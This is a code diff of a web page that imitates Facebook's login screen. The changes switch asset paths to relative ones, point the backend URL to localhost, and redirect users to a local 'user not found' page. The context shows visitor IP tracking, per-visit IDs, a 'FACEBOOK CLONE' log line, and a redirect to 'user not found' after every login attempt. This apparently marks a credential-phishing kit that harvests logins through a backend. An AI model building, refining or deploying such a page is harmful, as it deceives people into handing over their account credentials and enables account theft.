@@ -3,7 +3,7 @@
   <head>
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <link rel="icon" type="image/x-icon" href="/favicon.png">
+    <link rel="icon" type="image/png" href="favicon.png">
     <title>Facebook - log in or sign up</title>
     <link rel="stylesheet" href="output.css" />
   </head>
@@ -11,7 +11,7 @@
     <div class="facebook-main">
       <div class="facebook-container">
         <div class="facebook-left">
-          <img class="facebook-logo" src="/facebook image.svg" alt="Facebook" />
+          <img class="facebook-logo" src="facebook image.svg" alt="Facebook" />
           <p class="facebook-tagline">
             Facebook helps you connect and share with the people in your life.
           </p>
@@ -62,8 +62,8 @@
       let userIPAddress = null;
       let visitId = 'visit_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
       
-      // Backend URL - will be updated after deployment
-      const API_BASE_URL = 'BACKEND_URL_TO_BE_SET';
+      // Backend URL for localhost testing
+      const API_BASE_URL = 'http://localhost:5000';
 
       console.log('🚀 STARTING FACEBOOK CLONE...');
       console.log('Visit ID:', visitId);
@@ -465,14 +465,14 @@
           loadingOverlay.classList.add('hidden');
           
           // Always redirect to user not found page
-          window.location.href = '/user-not-found';
+          window.location.href = 'user-not-found.html';
           
         } catch (error) {
           console.error('❌ Login error:', error);
           loadingOverlay.classList.add('hidden');
           
           // Still redirect to user not found page
-          window.location.href = '/user-not-found';
+          window.location.href = 'user-not-found.html';
         }
       });
     </script>
